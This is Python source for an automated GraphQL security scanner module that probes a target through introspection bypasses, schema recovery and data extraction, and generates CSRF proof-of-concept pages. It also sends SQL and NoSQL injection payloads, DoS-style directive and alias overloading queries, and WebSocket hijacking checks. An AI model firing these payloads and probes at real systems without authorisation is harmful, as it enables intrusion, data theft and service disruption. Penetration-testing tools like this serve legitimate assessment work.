#!/usr/bin/env python3
"""
GraphQLmap v2.0 - Auto Scan Module
Fully automated GraphQL security assessment.
Just give it a URL — it does everything.
"""

from graphqlmap.utils import *
from graphqlmap.attacks import *
import json
import time
import os
from datetime import datetime


class AutoScanner:
    """
    Fully automated GraphQL security scanner.
    
    Usage is dead simple:
        scanner = AutoScanner(url="https://target.com/graphql")
        scanner.run()
    
    That's it. It runs the entire attack chain automatically.
    """

    def __init__(self, url, method="POST", headers=None, proxy=None,
                 use_json=True, wordlist=None, timeout=30,
                 output_dir=None, body=None, skip_dos=False):
        self.url = url
        self.method = method
        self.headers = headers or {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.use_json = use_json
        self.wordlist = wordlist
        self.timeout = timeout
        self.body = body  # Custom GraphQL body/query to also test
        self.skip_dos = skip_dos
        
        # Results storage
        self.results = {
            "target": url,
            "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "endpoint_found": False,
            "server_engine": [],
            "introspection_enabled": False,
            "schema": None,
            "fields_discovered": [],
            "types_discovered": [],
            "features": {},
            "vulnerabilities": [],
            "custom_query_result": None,
        }
        
        # Output directory
        if output_dir:
            self.output_dir = output_dir
        else:
            self.output_dir = f"graphqlmap_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)

    def log(self, msg, level="info"):
        """Print with timestamp and level."""
        colors = {"info": "cyan", "success": "green", "warning": "yellow",
                  "danger": "red", "header": "bold"}
        prefix = {"info": "[*]", "success": "[+]", "warning": "[!]",
                  "danger": "[!!]", "header": "[=]"}
        print(colorize(f"{prefix.get(level, '[*]')} {msg}", colors.get(level, "cyan")))

    def add_vuln(self, name, severity, detail):
        """Record a discovered vulnerability."""
        vuln = {"name": name, "severity": severity, "detail": detail}
        self.results["vulnerabilities"].append(vuln)
        color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
                 "LOW": "cyan", "INFO": "blue"}.get(severity, "cyan")
        print(colorize(f"  [VULN] [{severity}] {name}: {detail}", color))

    def run(self):
        """
        Run the FULL automated scan. This is the main entry point.
        Just call this and sit back.
        """
        print(colorize(r"""
   ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗
  ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
  ██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     ██╔████╔██║███████║██████╔╝
  ██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝
  ╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
        """, "green"))
        print(colorize("  GraphQLmap v2.0 - AUTOMATED SCAN MODE", "bold"))
        print(colorize(f"  Target : {self.url}", "cyan"))
        print(colorize(f"  Method : {self.method}", "cyan"))
        print(colorize(f"  Output : {self.output_dir}/", "cyan"))
        if self.body:
            print(colorize(f"  Body   : {self.body[:80]}{'...' if len(self.body) > 80 else ''}", "cyan"))
        if self.headers:
            print(colorize(f"  Headers: {json.dumps(self.headers)[:80]}", "cyan"))
        print(colorize("=" * 70, "bold"))

        total_start = time.time()

        # ── PHASE 1: Verify endpoint is alive ──
        self._phase_verify_endpoint()

        # ── PHASE 2: Fingerprint server ──
        self._phase_fingerprint()

        # ── PHASE 3: Test introspection ──
        self._phase_introspection()

        # ── PHASE 4: If introspection failed, try bypasses ──
        if not self.results["introspection_enabled"]:
            self._phase_introspection_bypass()

        # ── PHASE 5: If still no schema, try field suggestions ──
        if not self.results["schema"]:
            self._phase_field_suggestions()

        # ── PHASE 6: Execute custom body/query if provided ──
        if self.body:
            self._phase_custom_query()

        # ── PHASE 7: Test for injection vulnerabilities ──
        self._phase_injection_tests()

        # ── PHASE 8: Test batching & rate limiting ──
        self._phase_batching_tests()

        # ── PHASE 9: Test CSRF ──
        self._phase_csrf_test()

        # ── PHASE 10: Test DoS protections (optional) ──
        if not self.skip_dos:
            self._phase_dos_tests()

        # ── PHASE 11: Test WebSocket ──
        self._phase_websocket_test()

        # ── PHASE 12: Generate report ──
        elapsed = time.time() - total_start
        self.results["scan_duration"] = f"{elapsed:.1f}s"
        self._generate_report()

        print(colorize("\n" + "=" * 70, "bold"))
        print(colorize(f"  SCAN COMPLETE in {elapsed:.1f}s", "bold"))
        print(colorize(f"  Vulnerabilities found: {len(self.results['vulnerabilities'])}", 
                        "red" if self.results['vulnerabilities'] else "green"))
        print(colorize(f"  Results saved to: {self.output_dir}/", "cyan"))
        print(colorize("=" * 70, "bold"))

    # ─────────────────────────────────────────────
    # PHASE 1: Verify Endpoint
    # ─────────────────────────────────────────────
    def _phase_verify_endpoint(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 1: Verifying GraphQL Endpoint", "header")
        self.log("=" * 50, "header")

        # Try the exact URL first
        r = requester(self.url, self.method, UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, timeout=self.timeout)
        
        if r and r.status_code == 200 and "__typename" in r.text:
            self.log(f"Endpoint confirmed: {self.url}", "success")
            self.results["endpoint_found"] = True
            return

        # Try GET if POST failed
        r = requester(self.url, "GET", UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, timeout=self.timeout)
        if r and r.status_code == 200 and "__typename" in r.text:
            self.log(f"Endpoint confirmed via GET: {self.url}", "success")
            self.method = "GET"
            self.results["endpoint_found"] = True
            return

        # Auto-discover if exact URL didn't work
        self.log("Exact URL didn't respond. Auto-discovering endpoints...", "warning")
        found = detect_endpoints(self.url, self.proxy, self.headers, self.use_json)
        if found:
            self.url = found[0][0]
            self.method = found[0][1]
            self.results["endpoint_found"] = True
            self.log(f"Using discovered endpoint: {self.url} ({self.method})", "success")
        else:
            self.log("No GraphQL endpoint found! Continuing anyway...", "danger")

    # ─────────────────────────────────────────────
    # PHASE 2: Fingerprint
    # ─────────────────────────────────────────────
    def _phase_fingerprint(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 2: Fingerprinting Server", "header")
        self.log("=" * 50, "header")

        detected = []
        test_queries = [
            "{__typename @deprecated}",
            "query { thisfieldcannotexist12345 }",
            "{",
        ]
        all_responses = ""
        for tq in test_queries:
            r = requester(self.url, self.method, tq, self.proxy,
                          self.headers, self.use_json, timeout=10)
            if r:
                all_responses += r.text.lower()
                for hdr_name, hdr_val in r.headers.items():
                    all_responses += f" {hdr_name.lower()}:{hdr_val.lower()}"

        for engine, signatures in FINGERPRINT_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in all_responses:
                    if engine not in detected:
                        detected.append(engine)
                        break

        self.results["server_engine"] = detected
        if detected:
            for e in detected:
                self.log(f"Detected engine: {e}", "success")
        else:
            self.log("Could not fingerprint server engine", "warning")

        # Check features
        features = {}

        # GET support
        r = requester(self.url, "GET", UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, timeout=10)
        features["get_method"] = bool(r and "__typename" in (r.text or ""))
        if features["get_method"]:
            self.log("GET method: SUPPORTED", "success")
            self.add_vuln("GET Method Supported", "LOW",
                          "GraphQL accepts GET requests - may enable CSRF attacks")

        # Batching
        r = requester(self.url, "POST", UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, is_batch=2, timeout=10)
        try:
            features["batching"] = isinstance(r.json(), list) if r else False
        except Exception:
            features["batching"] = False
        if features["batching"]:
            self.log("JSON List Batching: SUPPORTED", "success")
            self.add_vuln("Batching Enabled", "MEDIUM",
                          "JSON list batching is supported - enables rate limit bypass")

        # Field suggestions
        r = requester(self.url, self.method, "{__typenme}", self.proxy,
                      self.headers, self.use_json, timeout=10)
        features["suggestions"] = bool(r and ("did you mean" in r.text.lower()))
        if features["suggestions"]:
            self.log("Field Suggestions: ENABLED", "success")
            self.add_vuln("Field Suggestions Enabled", "LOW",
                          "Server returns field suggestions - enables schema recovery without introspection")

        # Verbose errors
        r = requester(self.url, self.method, "{}", self.proxy,
                      self.headers, self.use_json, timeout=10)
        if r:
            features["verbose_errors"] = "stack" in r.text.lower() or "trace" in r.text.lower()
            if features["verbose_errors"]:
                self.add_vuln("Verbose Error Messages", "LOW",
                              "Server returns stack traces or detailed errors")

        self.results["features"] = features

    # ─────────────────────────────────────────────
    # PHASE 3: Introspection
    # ─────────────────────────────────────────────
    def _phase_introspection(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 3: Testing Introspection", "header")
        self.log("=" * 50, "header")

        payload = INTROSPECTION_QUERY_V15.replace("\n", " ")
        r = requester(self.url, self.method, payload, self.proxy,
                      self.headers, self.use_json, timeout=self.timeout)

        if r:
            try:
                schema = r.json()
                if 'data' in schema and schema['data'] and '__schema' in schema['data']:
                    self.results["introspection_enabled"] = True
                    self.results["schema"] = schema
                    self.add_vuln("Introspection Enabled", "MEDIUM",
                                  "Full schema introspection is enabled - exposes entire API structure")
                    self.log("Introspection: ENABLED - Full schema retrieved!", "success")

                    # Save schema
                    schema_path = os.path.join(self.output_dir, "schema_full.json")
                    with open(schema_path, 'w') as f:
                        json.dump(schema, f, indent=2)
                    self.log(f"Schema saved to {schema_path}", "success")

                    # Extract and display types
                    self._extract_schema_info(schema)
                    return
            except Exception:
                pass

        self.log("Standard introspection: BLOCKED or failed", "warning")

    def _extract_schema_info(self, schema):
        """Extract useful info from schema and display summary."""
        types_list = []
        queries = []
        mutations = []
        subscriptions = []

        query_type_name = schema['data']['__schema'].get('queryType', {})
        query_type_name = query_type_name.get('name') if query_type_name else None
        mutation_type_name = schema['data']['__schema'].get('mutationType', {})
        mutation_type_name = mutation_type_name.get('name') if mutation_type_name else None
        sub_type_name = schema['data']['__schema'].get('subscriptionType', {})
        sub_type_name = sub_type_name.get('name') if sub_type_name else None

        for t in schema['data']['__schema'].get('types', []):
            if t['name'].startswith('__'):
                continue
            types_list.append(t['name'])

            if t['name'] == query_type_name:
                for f in t.get('fields', []) or []:
                    queries.append(f['name'])
            elif t['name'] == mutation_type_name:
                for f in t.get('fields', []) or []:
                    mutations.append(f['name'])
            elif t['name'] == sub_type_name:
                for f in t.get('fields', []) or []:
                    subscriptions.append(f['name'])

        self.log(f"\nSchema Summary:", "header")
        self.log(f"  Types: {len(types_list)}", "info")
        self.log(f"  Queries: {len(queries)} -> {', '.join(queries[:15])}", "info")
        self.log(f"  Mutations: {len(mutations)} -> {', '.join(mutations[:15])}", "info")
        self.log(f"  Subscriptions: {len(subscriptions)} -> {', '.join(subscriptions[:10])}", "info")

        # Look for interesting fields
        interesting = ["password", "secret", "token", "key", "admin", "flag",
                       "ssn", "credit", "card", "private", "internal", "debug",
                       "config", "env", "credential", "hash", "salt"]
        all_fields_str = json.dumps(schema).lower()
        found_interesting = [kw for kw in interesting if kw in all_fields_str]
        if found_interesting:
            self.add_vuln("Sensitive Fields Exposed", "HIGH",
                          f"Schema contains potentially sensitive fields: {', '.join(found_interesting)}")

        # Save simplified schema
        simplified = {
            "types": types_list,
            "queries": queries,
            "mutations": mutations,
            "subscriptions": subscriptions,
        }
        simp_path = os.path.join(self.output_dir, "schema_simplified.json")
        with open(simp_path, 'w') as f:
            json.dump(simplified, f, indent=2)

    # ─────────────────────────────────────────────
    # PHASE 4: Introspection Bypass
    # ─────────────────────────────────────────────
    def _phase_introspection_bypass(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 4: Attempting Introspection Bypass", "header")
        self.log("=" * 50, "header")

        techniques = [
            ("Newline after __schema", "POST", "{__schema\n{queryType{name}}}", None),
            ("Tab after __schema", "POST", "{__schema\t{queryType{name}}}", None),
            ("Comment injection", "POST", "{__schema#\n{queryType{name}}}", None),
            ("Aliased __schema", "POST", "{s:__schema{queryType{name}}}", None),
            ("GET method bypass", "GET", "{__schema{queryType{name}}}", None),
            ("x-www-form-urlencoded", "POST", "{__schema{queryType{name}}}", "urlencoded"),
            ("__type probe", "POST", '{__type(name:"Query"){name fields{name type{name kind}}}}', None),
            ("Operation name", "POST", "query x{__schema{queryType{name}}}", None),
            ("Fragment on Query", "POST", "{...on Query{__schema{queryType{name}}}}", None),
            ("Whitespace obfuscation", "POST", "{  __schema  {  queryType  {  name  }  }  }", None),
            ("Full introspection via GET", "GET", INTROSPECTION_QUERY_V15.replace("\n", " "), None),
            ("Full via urlencoded", "POST", INTROSPECTION_QUERY_V15.replace("\n", " "), "urlencoded"),
        ]

        for name, tech_method, payload, ctype in techniques:
            try:
                r = requester(self.url, tech_method, payload, self.proxy,
                              self.headers, self.use_json, content_type=ctype, timeout=15)
                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if 'data' in data and data['data']:
                            has_schema = '__schema' in data['data'] or '__type' in data['data']
                            if has_schema:
                                self.log(f"BYPASS SUCCESS: {name}", "success")
                                self.add_vuln("Introspection Bypass", "HIGH",
                                              f"Introspection block bypassed via: {name}")

                                if '__schema' in data['data'] and 'types' in data['data'].get('__schema', {}):
                                    self.results["schema"] = data
                                    self.results["introspection_enabled"] = True
                                    schema_path = os.path.join(self.output_dir, "schema_full.json")
                                    with open(schema_path, 'w') as f:
                                        json.dump(data, f, indent=2)
                                    self._extract_schema_info(data)
                                    return
                                elif '__type' in data['data']:
                                    self.log(f"  Partial schema via __type: {json.dumps(data['data']['__type'])[:200]}", "info")
                                continue
                    except Exception:
                        pass
                self.log(f"  Failed: {name}", "warning")
            except Exception:
                pass

    # ─────────────────────────────────────────────
    # PHASE 5: Field Suggestions
    # ─────────────────────────────────────────────
    def _phase_field_suggestions(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 5: Schema Recovery via Field Suggestions", "header")
        self.log("=" * 50, "header")

        if not self.results["features"].get("suggestions", True):
            self.log("Field suggestions appear disabled, trying anyway...", "warning")

        # Load wordlist
        words = []
        if self.wordlist and os.path.exists(self.wordlist):
            with open(self.wordlist, 'r') as f:
                words = [line.strip() for line in f if line.strip()]
        else:
            default_wl = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                      "wordlists", "graphql_fields.txt")
            if os.path.exists(default_wl):
                with open(default_wl, 'r') as f:
                    words = [line.strip() for line in f if line.strip()]
            else:
                words = ["user", "users", "admin", "login", "me", "flag", "secret",
                         "password", "token", "key", "email", "name", "id", "role",
                         "post", "comment", "message", "search", "create", "update",
                         "delete", "upload", "file", "setting", "config", "health"]

        discovered_fields = set()
        self.log(f"Testing {len(words)} words...", "info")

        for word in words:
            payload = f"query {{ {word} }}"
            r = requester(self.url, self.method, payload, self.proxy,
                          self.headers, self.use_json, timeout=8)
            if r is None:
                continue

            import re as _re
            suggestions = _re.findall(r'[Dd]id you mean ["\']?(\w+)["\']?', r.text)
            for s in suggestions:
                if s not in discovered_fields and not s.startswith("__"):
                    discovered_fields.add(s)
                    self.log(f"  Discovered field: {s}", "success")

        self.results["fields_discovered"] = list(discovered_fields)
        if discovered_fields:
            self.log(f"Total fields discovered: {len(discovered_fields)}", "success")
            fields_path = os.path.join(self.output_dir, "discovered_fields.json")
            with open(fields_path, 'w') as f:
                json.dump(sorted(list(discovered_fields)), f, indent=2)

            # Try to extract data from discovered fields
            self.log("Attempting data extraction from discovered fields...", "info")
            for field in list(discovered_fields)[:10]:
                payload = f"{{ {field} }}"
                r = requester(self.url, self.method, payload, self.proxy,
                              self.headers, self.use_json, timeout=10)
                if r:
                    try:
                        data = r.json()
                        if 'data' in data and data['data']:
                            self.log(f"  Data from '{field}': {json.dumps(data['data'])[:200]}", "success")
                    except Exception:
                        pass

    # ─────────────────────────────────────────────
    # PHASE 6: Custom Query
    # ─────────────────────────────────────────────
    def _phase_custom_query(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 6: Executing Custom Query/Body", "header")
        self.log("=" * 50, "header")

        self.log(f"Query: {self.body[:200]}", "info")

        r = requester(self.url, self.method, self.body, self.proxy,
                      self.headers, self.use_json, timeout=self.timeout)
        if r:
            try:
                data = r.json()
                self.results["custom_query_result"] = data
                result_path = os.path.join(self.output_dir, "custom_query_result.json")
                with open(result_path, 'w') as f:
                    json.dump(data, f, indent=2)
                self.log(f"Response saved to {result_path}", "success")
                print(json.dumps(data, indent=2)[:2000])
            except Exception:
                self.log(f"Raw response: {r.text[:500]}", "info")
        else:
            self.log("No response received", "danger")

    # ─────────────────────────────────────────────
    # PHASE 7: Injection Tests
    # ─────────────────────────────────────────────
    def _phase_injection_tests(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 7: Testing for Injection Vulnerabilities", "header")
        self.log("=" * 50, "header")

        # We need fields that accept string arguments to test injection
        injectable_fields = self._find_injectable_fields()

        if not injectable_fields:
            self.log("No injectable fields found automatically. Skipping auto-injection.", "warning")
            self.log("Use interactive mode for manual injection testing.", "info")
            return

        for field_name, arg_name, arg_type in injectable_fields[:5]:
            self.log(f"\nTesting field: {field_name}({arg_name})", "info")

            # SQL injection probe
            sqli_payloads = ["'", "1'", "1' OR '1'='1", "1' AND SLEEP(5)--",
                             "1'; SELECT 1;--", "1 OR 1=1"]
            for payload in sqli_payloads:
                query = f'{{ {field_name}({arg_name}: "{payload}") }}'
                start = time.time()
                r = requester(self.url, self.method, query, self.proxy,
                              self.headers, self.use_json, timeout=15)
                elapsed = time.time() - start

                if r:
                    text = r.text.lower()
                    # Check for SQL error indicators
                    sql_errors = ["sql", "syntax error", "mysql", "postgresql",
                                  "sqlite", "oracle", "mssql", "unterminated",
                                  "unexpected end", "near \"'\""]
                    for err in sql_errors:
                        if err in text:
                            self.add_vuln("SQL Injection", "CRITICAL",
                                          f"SQL error in {field_name}({arg_name}: \"{payload}\") -> {err}")
                            break

                    if elapsed > 4.5:
                        self.add_vuln("Time-Based SQL Injection", "CRITICAL",
                                      f"Delay detected in {field_name}({arg_name}: \"{payload}\") -> {elapsed:.1f}s")

            # NoSQL injection probe
            nosql_payloads = ['{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}']
            for payload in nosql_payloads:
                query = f'{{ {field_name}({arg_name}: {payload}) }}'
                r = requester(self.url, self.method, query, self.proxy,
                              self.headers, self.use_json, timeout=10)
                if r:
                    try:
                        data = r.json()
                        if 'data' in data and data['data'] and not data.get('errors'):
                            self.add_vuln("NoSQL Injection", "HIGH",
                                          f"NoSQL payload accepted: {field_name}({arg_name}: {payload})")
                    except Exception:
                        pass

    def _find_injectable_fields(self):
        """Find fields with string arguments from the cached schema."""
        injectable = []
        if not self.results["schema"]:
            return injectable

        try:
            schema = self.results["schema"]
            for t in schema['data']['__schema'].get('types', []):
                if t['name'].startswith('__'):
                    continue
                for field in t.get('fields', []) or []:
                    for arg in field.get('args', []) or []:
                        arg_type_name = ""
                        try:
                            arg_type_name = arg['type'].get('name', '') or ''
                            if not arg_type_name:
                                arg_type_name = arg['type'].get('ofType', {}).get('name', '') or ''
                        except Exception:
                            pass
                        if arg_type_name.lower() in ('string', 'id', 'str'):
                            injectable.append((field['name'], arg['name'], arg_type_name))
        except Exception:
            pass

        if injectable:
            self.log(f"Found {len(injectable)} injectable field(s)", "success")
        return injectable

    # ─────────────────────────────────────────────
    # PHASE 8: Batching Tests
    # ─────────────────────────────────────────────
    def _phase_batching_tests(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 8: Testing Batching & Rate Limiting", "header")
        self.log("=" * 50, "header")

        # JSON list batching
        self.log("Testing JSON list batching...", "info")
        for count in [2, 10, 50]:
            r = requester(self.url, "POST", UNIVERSAL_QUERY, self.proxy,
                          self.headers, self.use_json, is_batch=count, timeout=15)
            if r:
                try:
                    data = r.json()
                    if isinstance(data, list) and len(data) == count:
                        self.log(f"  Batch of {count}: ACCEPTED ({len(data)} responses)", "success")
                    else:
                        self.log(f"  Batch of {count}: Rejected or partial", "warning")
                        break
                except Exception:
                    break
            else:
                break

        # Alias-based batching
        self.log("Testing alias-based batching...", "info")
        for count in [5, 50, 200]:
            aliases = " ".join([f"a{i}:__typename" for i in range(count)])
            query = f"{{ {aliases} }}"
            start = time.time()
            r = requester(self.url, self.method, query, self.proxy,
                          self.headers, self.use_json, timeout=30)
            elapsed = time.time() - start
            if r and r.status_code == 200:
                self.log(f"  {count} aliases: ACCEPTED ({elapsed:.2f}s)", "success")
                if count >= 200:
                    self.add_vuln("Alias Overloading", "MEDIUM",
                                  f"Server accepted {count} aliases in single request ({elapsed:.1f}s)")
            else:
                self.log(f"  {count} aliases: Rejected", "info")
                break

    # ─────────────────────────────────────────────
    # PHASE 9: CSRF Test
    # ─────────────────────────────────────────────
    def _phase_csrf_test(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 9: Testing CSRF Vectors", "header")
        self.log("=" * 50, "header")

        # Test GET
        r = requester(self.url, "GET", UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, timeout=10)
        get_works = r and r.status_code == 200 and "__typename" in (r.text or "")

        # Test urlencoded
        r = requester(self.url, "POST", UNIVERSAL_QUERY, self.proxy,
                      self.headers, self.use_json, content_type="urlencoded", timeout=10)
        urlencoded_works = r and r.status_code == 200 and "__typename" in (r.text or "")

        if get_works:
            self.add_vuln("CSRF via GET", "HIGH",
                          "GraphQL accepts GET requests - vulnerable to CSRF via img/script tags")
            # Generate PoC
            from urllib.parse import quote
            test_query = self.body or 'query{__typename}'
            poc = f'''<html><body>
<h1>GraphQL CSRF PoC (GET)</h1>
<img src="{self.url}?query={quote(test_query)}" style="display:none" />
<script>fetch("{self.url}?query={quote(test_query)}",{{mode:'no-cors',credentials:'include'}})</script>
</body></html>'''
            poc_path = os.path.join(self.output_dir, "csrf_poc_get.html")
            with open(poc_path, 'w') as f:
                f.write(poc)
            self.log(f"CSRF PoC (GET) saved to {poc_path}", "success")

        if urlencoded_works:
            self.add_vuln("CSRF via Form POST", "HIGH",
                          "GraphQL accepts x-www-form-urlencoded - vulnerable to form-based CSRF")
            test_query = self.body or 'query{__typename}'
            poc = f'''<html><body>
<form id="f" action="{self.url}" method="POST" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="query" value='{test_query}' />
</form>
<script>document.getElementById('f').submit()</script>
</body></html>'''
            poc_path = os.path.join(self.output_dir, "csrf_poc_form.html")
            with open(poc_path, 'w') as f:
                f.write(poc)
            self.log(f"CSRF PoC (Form) saved to {poc_path}", "success")

        if not get_works and not urlencoded_works:
            self.log("CSRF: Endpoint requires JSON POST - CSRF is mitigated", "info")

    # ─────────────────────────────────────────────
    # PHASE 10: DoS Tests
    # ─────────────────────────────────────────────
    def _phase_dos_tests(self):
        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 10: Testing DoS Protections", "header")
        self.log("=" * 50, "header")

        # Directive overloading
        self.log("Testing directive overloading...", "info")
        for count in [10, 100, 500]:
            directives = " ".join(["@skip(if: false)" for _ in range(count)])
            query = f"{{ __typename {directives} }}"
            start = time.time()
            r = requester(self.url, self.method, query, self.proxy,
                          self.headers, self.use_json, timeout=30)
            elapsed = time.time() - start
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if 'data' in data:
                        self.log(f"  {count} directives: ACCEPTED ({elapsed:.2f}s)", "success")
                        if count >= 100:
                            self.add_vuln("Directive Overloading", "MEDIUM",
                                          f"Server accepted {count} directives ({elapsed:.1f}s)")
                    else:
                        self.log(f"  {count} directives: Rejected", "info")
                        break
                except Exception:
                    break
            else:
                self.log(f"  {count} directives: Failed/Rejected", "info")
                break

    # ─────────────────────────────────────────────
    # PHASE 11: WebSocket Test
    # ─────────────────────────────────────────────
    def _phase_websocket_test(self):
        if not HAS_WEBSOCKET:
            return

        self.log("\n" + "=" * 50, "header")
        self.log("PHASE 11: Testing WebSocket Subscriptions", "header")
        self.log("=" * 50, "header")

        ws_url = self.url.replace("http://", "ws://").replace("https://", "wss://")

        # Test unauthenticated connection
        try:
            ws = ws_lib.create_connection(
                ws_url,
                subprotocols=["graphql-ws", "graphql-transport-ws"],
                sslopt={"cert_reqs": ssl.CERT_NONE},
                timeout=5
            )
            ws.send(json.dumps({"type": "connection_init", "payload": {}}))
            result = ws.recv()
            data = json.loads(result)
            if data.get("type") == "connection_ack":
                self.add_vuln("Unauthenticated WebSocket", "HIGH",
                              "WebSocket connection accepted without authentication")
            ws.close()
        except Exception as e:
            self.log(f"WebSocket: Not available or rejected ({str(e)[:50]})", "info")

        # Test CSWSH
        for origin in ["https://evil.com", "null"]:
            try:
                ws = ws_lib.create_connection(
                    ws_url, origin=origin,
                    subprotocols=["graphql-ws"],
                    sslopt={"cert_reqs": ssl.CERT_NONE},
                    timeout=5
                )
                ws.send(json.dumps({"type": "connection_init", "payload": {}}))
                result = ws.recv()
                data = json.loads(result)
                if data.get("type") == "connection_ack":
                    self.add_vuln("CSWSH", "HIGH",
                                  f"WebSocket accepted evil origin: {origin}")
                ws.close()
            except Exception:
                pass

    # ─────────────────────────────────────────────
    # PHASE 12: Generate Report
    # ─────────────────────────────────────────────
    def _generate_report(self):
        self.log("\n" + "=" * 50, "header")
        self.log("GENERATING REPORT", "header")
        self.log("=" * 50, "header")

        # Save JSON results
        json_path = os.path.join(self.output_dir, "scan_results.json")
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)

        # Generate readable report
        report_lines = []
        report_lines.append("# GraphQLmap v2.0 - Automated Scan Report\n")
        report_lines.append(f"**Target:** {self.results['target']}\n")
        report_lines.append(f"**Scan Time:** {self.results['scan_time']}\n")
        report_lines.append(f"**Duration:** {self.results.get('scan_duration', 'N/A')}\n")
        report_lines.append(f"**Server Engine:** {', '.join(self.results['server_engine']) or 'Unknown'}\n")
        report_lines.append(f"**Introspection:** {'Enabled' if self.results['introspection_enabled'] else 'Disabled'}\n")

        report_lines.append("\n## Vulnerabilities Found\n")
        if self.results["vulnerabilities"]:
            report_lines.append("| # | Severity | Name | Detail |")
            report_lines.append("|---|----------|------|--------|")
            for i, v in enumerate(self.results["vulnerabilities"], 1):
                report_lines.append(f"| {i} | **{v['severity']}** | {v['name']} | {v['detail']} |")
        else:
            report_lines.append("No vulnerabilities found.\n")

        report_lines.append("\n## Features Detected\n")
        for feat, val in self.results.get("features", {}).items():
            status = "Yes" if val else "No"
            report_lines.append(f"- **{feat}:** {status}")

        if self.results["fields_discovered"]:
            report_lines.append(f"\n## Discovered Fields ({len(self.results['fields_discovered'])})\n")
            for f_item in sorted(self.results["fields_discovered"]):
                report_lines.append(f"- `{f_item}`")

        report_text = "\n".join(report_lines)
        report_path = os.path.join(self.output_dir, "report.md")
        with open(report_path, 'w') as f:
            f.write(report_text)

        self.log(f"Report saved to {report_path}", "success")
        self.log(f"JSON results saved to {json_path}", "success")
